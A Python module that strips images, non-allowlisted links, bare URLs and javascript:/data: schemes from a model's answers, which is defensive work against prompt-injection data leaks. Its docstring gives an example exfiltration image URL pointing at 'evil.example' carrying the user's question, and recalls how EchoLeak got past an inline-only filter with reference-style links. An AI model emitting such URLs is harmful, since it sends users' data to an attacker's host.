"""Output checks: what an answer may make a client fetch.

The model has no tools, so the worst a prompt injection can do is shape the text it returns. The
dangerous text is the kind a client acts on without a click: a Markdown or HTML image fetches its
URL the moment it is rendered, so `![x](https://evil.example/?q=<the user's question>)` leaks data
to whoever owns that host. A link needs a click, but it is the same leak one step later.

These checks never involve the model, which is why they hold even when an injection succeeds:

- every image is removed, wherever its URL points;
- every link is removed unless its host is in `safety.output.allowed_link_hosts` (empty by
  default). A removed link keeps its label, so the sentence still reads;
- inline and reference-style Markdown, raw HTML, autolinks and bare URLs are all parsed.
  Reference-style links matter: EchoLeak got past a filter that only knew the inline form;
- `javascript:`, `data:` and every other scheme that is not http(s) is never allowed.

The same function runs over retrieved excerpts and source names, which reach a client without
passing through the model at all.

This is a filter on what is *produced*, not a sanitiser for what a client *renders*: `answer`,
`excerpt` and `source_uri` stay untrusted text, and a client must still escape them.
"""

import html
import logging
import re
from collections.abc import Iterable
from dataclasses import dataclass
from urllib.parse import urlsplit

logger = logging.getLogger(__name__)

ALLOWED_SCHEMES = frozenset({"http", "https"})

# A link label: text without brackets, or containing one level of nested brackets (an image
# inside a link, `[![alt](src)](href)`, is the common case).
_LABEL = r"\[((?:[^\[\]\\]|\\.|\[(?:[^\[\]\\]|\\.)*\])*)\]"
# A link destination: `<anything but >>` or a run without spaces, allowing balanced parentheses,
# then an optional title in any of the three quoting styles.
_DESTINATION = (
    r"\(\s*(<[^>\n]*>|(?:[^()\s\\]|\\.|\((?:[^()\s\\]|\\.)*\))*)"
    r"(?:\s+(?:\"[^\"]*\"|'[^']*'|\([^)]*\)))?\s*\)"
)
_INLINE_IMAGE = re.compile(r"!" + _LABEL + _DESTINATION)
_INLINE_LINK = re.compile(_LABEL + _DESTINATION)
# `[label]: destination "title"` on a line of its own (up to three spaces of indent).
_REFERENCE_DEFINITION = re.compile(
    r"^[ \t]{0,3}\[((?:[^\[\]\\]|\\.)+)\]:[ \t]*\n?[ \t]*(<[^>\n]*>|\S+)"
    r"(?:[ \t]*\n?[ \t]*(?:\"[^\"]*\"|'[^']*'|\([^)]*\)))?[ \t]*$",
    re.MULTILINE,
)
# `![alt][ref]`, `![alt][]` and `![alt]`; `[label][ref]`, `[label][]` and `[label]`.
_REFERENCE_IMAGE = re.compile(r"!" + _LABEL + r"(?:\[((?:[^\[\]\\]|\\.)*)\])?")
_REFERENCE_LINK = re.compile(_LABEL + r"(?:\[((?:[^\[\]\\]|\\.)*)\])?")
_AUTOLINK = re.compile(r"<([A-Za-z][A-Za-z0-9+.\-]{1,31}:[^<>\s]*)>")

# Raw HTML. Media elements are removed whole; a tag carrying a URL attribute is removed, and an
# anchor's text is kept the way a Markdown link's label is.
_MEDIA_ELEMENT = re.compile(
    r"<(img|image|picture|source|video|audio|track|iframe|frame|object|embed|svg|math|link|meta"
    r"|style|script|base|input|form|portal)\b[^>]*>(?:.*?</\1\s*>)?",
    re.IGNORECASE | re.DOTALL,
)
_ANCHOR = re.compile(r"<a\b([^>]*)>(.*?)</a\s*>", re.IGNORECASE | re.DOTALL)
_URL_ATTRIBUTE = re.compile(
    r"\b(?:href|src|srcset|xlink:href|action|formaction|poster|background|data|cite|lowsrc"
    r"|dynsrc|ping|style)\s*=\s*(\"[^\"]*\"|'[^']*'|[^\s>]+)",
    re.IGNORECASE,
)
_ANY_TAG_WITH_URL = re.compile(r"<[A-Za-z][^<>]*>")

# Bare URLs, which GitHub-flavoured Markdown turns into links by itself.
_BARE_URL = re.compile(r"(?<![\w@/])(?:(?:https?|ftp)://|www\.)[^\s<>\"'`]+", re.IGNORECASE)
# Schemes that run or embed something, wherever they still appear as a URL in the text. In a
# link they are already refused by the allow-list; this catches one left as text, which a
# careless client might still linkify. Prose such as "JavaScript: a language" is not a URL.
_DANGEROUS_SCHEME = re.compile(
    r"(?i)\b(?:javascript|vbscript):(?=\S)\S+|\bdata:[\w.+-]+/[\w.+-]+[;,]\S*"
)
_TRAILING_PUNCTUATION = ".,;:!?)]}*_~'\""


@dataclass(frozen=True)
class OutputPolicy:
    """What a link may point at. Hosts are matched exactly, lower-cased, without a port."""

    allowed_link_hosts: frozenset[str] = frozenset()

    @classmethod
    def of(cls, hosts: Iterable[str]) -> "OutputPolicy":
        return cls(frozenset(h.strip().lower().rstrip(".") for h in hosts if h.strip()))

    def allows_link(self, url: str) -> bool:
        """True only for an absolute http(s) URL whose host is on the list."""
        target = _decode_destination(url)
        if not target or any(ord(c) < 0x20 for c in target):
            return False
        try:
            parts = urlsplit(target)
            host = (parts.hostname or "").rstrip(".")
        except ValueError:
            return False
        return (
            parts.scheme.lower() in ALLOWED_SCHEMES
            and bool(host)
            and host in self.allowed_link_hosts
        )


@dataclass(frozen=True)
class Cleaned:
    text: str
    removed: int  # how many images, links and URLs were taken out


def _decode_destination(url: str) -> str:
    """The URL a renderer would follow: brackets, entities and Markdown escapes resolved."""
    url = url.strip()
    if url.startswith("<") and url.endswith(">"):
        url = url[1:-1]
    url = html.unescape(url)
    url = re.sub(r"\\([!-/:-@\[-`{-~])", r"\1", url)
    # Browsers strip tabs and newlines from inside a URL before following it.
    return re.sub(r"[\t\n\r]", "", url).strip()


def _normalise_label(label: str) -> str:
    return " ".join(label.lower().split())


class OutputSanitizer:
    """Removes images and disallowed links from text that is about to reach a client."""

    def __init__(self, policy: OutputPolicy | None = None) -> None:
        self._policy = policy or OutputPolicy()

    @property
    def policy(self) -> OutputPolicy:
        return self._policy

    def clean(self, text: str) -> Cleaned:
        if not text:
            return Cleaned(text, 0)
        counter = _Counter()
        # HTML first, so a tag cannot hide inside what Markdown parsing would otherwise read.
        text = self._html(text, counter)
        # Reference definitions next: they decide what `[label][ref]` points at.
        text, definitions = self._definitions(text, counter)
        text = _INLINE_IMAGE.sub(counter.drop, text)
        text = _REFERENCE_IMAGE.sub(lambda m: self._reference_image(m, definitions, counter), text)
        text = _INLINE_LINK.sub(lambda m: self._inline_link(m, counter), text)
        text = _REFERENCE_LINK.sub(lambda m: self._reference_link(m, definitions, counter), text)
        text = _AUTOLINK.sub(lambda m: self._bare(m.group(1), m.group(0), counter), text)
        text = _BARE_URL.sub(lambda m: self._bare_url(m.group(0), counter), text)
        text = _DANGEROUS_SCHEME.sub(counter.drop, text)
        return Cleaned(text, counter.count)

    def clean_text(self, text: str, *, field: str) -> str:
        """`clean`, logging what was removed (never the text itself) under the field's name."""
        result = self.clean(text)
        if result.removed:
            logger.info(
                "output check removed %d image(s) or link(s) from %s",
                result.removed,
                field,
                extra={"field": field, "removed": result.removed},
            )
        return result.text

    # ---- HTML -----------------------------------------------------------------------------

    def _html(self, text: str, counter: "_Counter") -> str:
        text = _MEDIA_ELEMENT.sub(counter.drop, text)
        text = _ANCHOR.sub(lambda m: self._anchor(m, counter), text)
        return _ANY_TAG_WITH_URL.sub(lambda m: self._tag(m.group(0), counter), text)

    def _anchor(self, match: re.Match[str], counter: "_Counter") -> str:
        hrefs = [_unquote(v) for v in _URL_ATTRIBUTE.findall(match.group(1))]
        if hrefs and all(self._policy.allows_link(h) for h in hrefs):
            return match.group(0)
        counter.count += 1
        return match.group(2)

    def _tag(self, tag: str, counter: "_Counter") -> str:
        values = [_unquote(v) for v in _URL_ATTRIBUTE.findall(tag)]
        if not values or all(self._policy.allows_link(v) for v in values):
            return tag
        counter.count += 1
        return ""

    # ---- Markdown -------------------------------------------------------------------------

    def _definitions(self, text: str, counter: "_Counter") -> tuple[str, dict[str, bool]]:
        """Remove disallowed reference definitions; return label -> whether it is allowed."""
        definitions: dict[str, bool] = {}

        def replace(match: re.Match[str]) -> str:
            allowed = self._policy.allows_link(match.group(2))
            definitions.setdefault(_normalise_label(match.group(1)), allowed)
            if allowed:
                return match.group(0)
            counter.count += 1
            return ""

        return _REFERENCE_DEFINITION.sub(replace, text), definitions

    def _reference_image(
        self, match: re.Match[str], definitions: dict[str, bool], counter: "_Counter"
    ) -> str:
        ref = match.group(2) or match.group(1)
        if _normalise_label(ref) not in definitions:
            return match.group(0)  # no definition: it renders as plain text, not an image
        counter.count += 1
        return ""

    def _inline_link(self, match: re.Match[str], counter: "_Counter") -> str:
        if self._policy.allows_link(match.group(2)):
            return match.group(0)
        counter.count += 1
        return match.group(1)

    def _reference_link(
        self, match: re.Match[str], definitions: dict[str, bool], counter: "_Counter"
    ) -> str:
        ref = match.group(2) or match.group(1)
        allowed = definitions.get(_normalise_label(ref))
        if allowed is None or allowed:
            return match.group(0)
        counter.count += 1
        return match.group(1)

    # ---- bare URLs ------------------------------------------------------------------------

    def _bare_url(self, url: str, counter: "_Counter") -> str:
        stripped = url.rstrip(_TRAILING_PUNCTUATION)
        trailing = url[len(stripped) :]
        target = stripped if "://" in stripped else f"https://{stripped}"  # `www.` form
        return self._bare(target, stripped, counter) + trailing

    def _bare(self, url: str, original: str, counter: "_Counter") -> str:
        if self._policy.allows_link(url):
            return original
        counter.count += 1
        return ""


class _Counter:
    def __init__(self) -> None:
        self.count = 0

    def drop(self, _: re.Match[str]) -> str:
        self.count += 1
        return ""


def _unquote(value: str) -> str:
    if len(value) >= 2 and value[0] == value[-1] and value[0] in "\"'":
        return value[1:-1]
    return value
